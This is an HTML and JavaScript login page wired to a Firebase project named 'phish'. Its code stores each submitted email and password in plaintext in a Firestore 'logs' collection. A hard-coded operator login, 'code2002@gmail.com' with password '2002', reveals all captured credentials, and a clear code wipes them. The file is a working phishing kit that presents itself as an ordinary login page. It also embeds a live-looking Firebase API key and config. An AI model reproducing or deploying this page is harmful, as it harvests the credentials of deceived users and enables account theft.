<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        #logs {
            margin-top: 20px;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #ccc;
            padding: 10px;
            background-color: #f9f9f9;
        }
        #logs div {
            margin-bottom: 10px;
        }
    </style>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button onclick="login()">Login</button>

        <h2>Logs</h2>
        <input type="text" id="clearCode" placeholder="Enter 2002 to clear logs">
        <button onclick="clearLogs()">Clear Logs</button>
        <div id="logs"></div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAqFG75g9KyHh_IwP7ok6OyVMaOIG3aqP4",
            authDomain: "phish-6a4fb.firebaseapp.com",
            projectId: "phish-6a4fb",
            storageBucket: "phish-6a4fb.firebasestorage.app",
            messagingSenderId: "580853387084",
            appId: "1:580853387084:web:b7e13ddcc56551bc4b49e9",
            measurementId: "G-QLK709FFDL"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            try {
                await auth.signInWithEmailAndPassword(email, password);
                if (email === 'code2002@gmail.com' && password === '2002') {
                    showLogs();
                } else {
                    logCredential(email, password);
                }
            } catch (error) {
                alert('Invalid email or password');
            }
        }

        function logCredential(email, password) {
            db.collection('logs').add({
                email: email,
                password: password,
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });
        }

        function showLogs() {
            db.collection('logs').get().then((querySnapshot) => {
                const logsDiv = document.getElementById('logs');
                logsDiv.innerHTML = '';
                querySnapshot.forEach((doc) => {
                    const log = doc.data();
                    const logElement = document.createElement('div');
                    logElement.textContent = `Email: ${log.email}, Password: ${log.password}`;
                    logsDiv.appendChild(logElement);
                    logsDiv.appendChild(document.createElement('hr'));
                });
            });
        }

        function clearLogs() {
            const clearCode = document.getElementById('clearCode').value;
            if (clearCode === '2002') {
                db.collection('logs').get().then((querySnapshot) => {
                    querySnapshot.forEach((doc) => {
                        doc.ref.delete();
                    });
                });
            } else {
                alert('Invalid clear code');
            }
        }
    </script>
</body>
</html>
